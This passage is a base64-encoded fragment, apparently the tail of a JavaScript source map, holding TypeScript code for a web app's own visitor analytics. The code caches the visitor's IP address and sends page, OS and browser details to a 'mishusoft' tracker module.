7IiwiaW1wb3J0IHsgYXBwIH0gZnJvbSBcIkAvcmVzb3VyY2VzL3R5cGVzY3JpcHRzL2RiL2FwcFwiO1xuaW1wb3J0IHsgc2VuZFJlcXVlc3QgfSBmcm9tIFwiQC9yZXNvdXJjZXMvdHlwZXNjcmlwdHMvY29tbW9uL3JlcXVlc3RcIjtcbmltcG9ydCB7IEJyb3dzZXIgfSBmcm9tIFwiQC9yZXNvdXJjZXMvdHlwZXNjcmlwdHMvbWlzaHVzb2Z0L2Jyb3dzZXJcIjtcbmltcG9ydCB7IFRyYWNrZXIgfSBmcm9tIFwiQC9yZXNvdXJjZXMvdHlwZXNjcmlwdHMvbWlzaHVzb2Z0L1RyYWNrZXJcIjtcblxuaW1wb3J0KFwiLi9kYi9hcHBcIilcbiAgICAudGhlbihmdW5jdGlvbiAoZGIpIHtcbiAgICAgICAgZnVuY3Rpb24gaW5pdERiKCkge1xuICAgICAgICAgICAgaWYgKHdpbmRvdy5zZXNzaW9uU3RvcmFnZSkge1xuICAgICAgICAgICAgICAgIGlmICh3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbShcImlwXCIpID09PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbmRSZXF1ZXN0KFxuICAgICAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ldGhvZDogXCJHRVRcIixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGRiLmFwcC53ZWJzaXRlLmlwSW5mb0RlZGljYXRlZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXI6IFt7IG5hbWU6IFwiQWNjZXB0XCIsIHZhbHVlOiBcImFwcGxpY2F0aW9uL2pzb25cIiB9XSxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiAoSXBEYXRhUmVwbHk6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5zZXRJdGVtKFwiaXBcIiwgSlNPTi5wYXJzZShJcERhdGFSZXBseSkuaXApO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICApO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihcIkVycm9yOjogWW91ciBicm93c2VyIGRvZXMgbm90IHN1cHBvcnQgc2Vzc2lvbiEhIFBsZWFzZSB1cGdyYWRlIG9yIGNoYW5nZSB5b3VyIGJyb3dzZXIhIVwiKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgIC8qbmV3IHRyYWNrZXIgYWRkZWQqL1xuICAgICAgICBpbml0RGIoKTtcbiAgICAgICAgY29uc3QgYXBwVmVyc2lvbiA9IGRiLmFwcC5kZWZhdWx0LnZlcnNpb247XG4gICAgICAgIGNvbnN0IGFwcFRyYWNrZXIgPSBkYi5hcHAuZGVmYXVsdC5uYW1lICsgXCJAXCIgKyBhcHBWZXJzaW9uO1xuXG4gICAgICAgIGltcG9ydChcIi4vbWlzaHVzb2Z0L2Jyb3dzZXJcIilcbiAgICAgICAgICAgIC50aGVuKGZ1bmN0aW9uIChtb2R1bGUpIHtcbiAgICAgICAgICAgICAgICBjb25zdCBicm93c2VyID0gbmV3IG1vZHVsZS5Ccm93c2VyKCk7XG4gICAgICAgICAgICAgICAgY29uc3Qgb3NOYW1lQXJjaCA9IGJyb3dzZXIuZ2V0UGxhdGZvcm1OYW1lKCkgKyBcIiBcIiArIGJyb3dzZXIuZ2V0UGxhdGZvcm1BcmNoaXRlY3R1cmUoKTtcbiAgICAgICAgICAgICAgICBjb25zdCBicm93c2VyRnVsbE5hbWUgPSBicm93c2VyLmdldEJyb3dzZXJOYW1lRnVsbCgpO1xuXG4gICAgICAgICAgICAgICAgaW1wb3J0KFwiLi9taXNodXNvZnQvVHJhY2tlclwiKVxuICAgICAgICAgICAgICAgICAgICAudGhlbihmdW5jdGlvbiAodCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbmV3IHQuVHJhY2tlcih3aW5kb3cubG9jYXRpb24uaHJlZiwgYXBwVHJhY2tlciwgYXBwVmVyc2lvbiwgb3NOYW1lQXJjaCwgYnJvd3NlckZ1bGxOYW1lKS5pbml0KGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0LlRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6IFwic2F2ZU5hdmlnYXRlRGF0YVwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZTogXCJ2aXNpdG9yXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3b3JrV2Vic2l0ZTogd2luZG93LmxvY2F0aW9uLm9yaWdpbixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAuY2F0Y2goZnVuY3Rpb24gKGVycikge1xuICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coZXJyKTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9KVxuICAgICAgICAgICAgLmNhdGNoKGZ1bmN0aW9uIChlcnIpIHtcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlcnIpO1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIC8qbmV3IHRyYWNrZXIgYWRkZWQqL1xuICAgIH0pXG4gICAgLmNhdGNoKGZ1bmN0aW9uIChlcnIpIHtcbiAgICAgICAgY29uc29sZS5sb2coZXJyKTtcbiAgICB9KTtcblxuLypuZXcgdHJhY2tlciBhZGRlZCovXG5mdW5jdGlvbiBpbml0RGIoKSB7XG4gICAgaWYgKHdpbmRvdy5zZXNzaW9uU3RvcmFnZSkge1xuICAgICAgICBpZiAod2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oXCJpcFwiKSA9PT0gbnVsbCkge1xuICAgICAgICAgICAgc2VuZFJlcXVlc3QoXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBtZXRob2Q6IFwiR0VUXCIsXG4gICAgICAgICAgICAgICAgICAgIHVybDogYXBwLndlYnNpdGUuaXBJbmZvRGVkaWNhdGVkLFxuICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgaGVhZGVyOiBbeyBuYW1lOiBcIkFjY2VwdFwiLCB2YWx1ZTogXCJhcHBsaWNhdGlvbi9qc29uXCIgfV0sXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICBmdW5jdGlvbiAoSXBEYXRhUmVwbHk6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICB3aW5kb3cuc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbShcImlwXCIsIEpTT04ucGFyc2UoSXBEYXRhUmVwbHkpLmlwKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICApO1xuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgY29uc29sZS5lcnJvcihcIkVycm9yOjogWW91ciBicm93c2VyIGRvZXMgbm90IHN1cHBvcnQgc2Vzc2lvbiEhIFBsZWFzZSB1cGdyYWRlIG9yIGNoYW5nZSB5b3VyIGJyb3dzZXIhIVwiKTtcbiAgICB9XG59XG5cbmluaXREYigpO1xuY29uc3QgYXBwVmVyc2lvbiA9IGFwcC5kZWZhdWx0LnZlcnNpb247XG5jb25zdCBhcHBUcmFja2VyID0gYXBwLmRlZmF1bHQubmFtZSArIFwiQFwiICsgYXBwVmVyc2lvbjtcblxuY29uc3QgYnJvd3NlciA9IG5ldyBCcm93c2VyKCk7XG5jb25zdCBvc05hbWVBcmNoID0gYnJvd3Nlci5nZXRQbGF0Zm9ybU5hbWUoKSArIFwiIFwiICsgYnJvd3Nlci5nZXRQbGF0Zm9ybUFyY2hpdGVjdHVyZSgpO1xuY29uc3QgYnJvd3NlckZ1bGxOYW1lID0gYnJvd3Nlci5nZXRCcm93c2VyTmFtZUZ1bGwoKTtcblxubmV3IFRyYWNrZXIod2luZG93LmxvY2F0aW9uLmhyZWYsIGFwcFRyYWNrZXIsIGFwcFZlcnNpb24sIG9zTmFtZUFyY2gsIGJyb3dzZXJGdWxsTmFtZSkuaW5pdChmdW5jdGlvbiAoKSB7XG4gICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgY29tbWFuZDogXCJzYXZlTmF2aWdhdGVEYXRhXCIsXG4gICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgIHVzZXJuYW1lOiBcInZpc2l0b3JcIixcbiAgICAgICAgICAgIHdvcmtXZWJzaXRlOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luLFxuICAgICAgICB9LFxuICAgIH0pO1xufSk7XG5cbi8qbmV3IHRyYWNrZXIgYWRkZWQqL1xuIl0sIm5hbWVzIjpbXSwic291cmNlUm9vdCI6IiJ9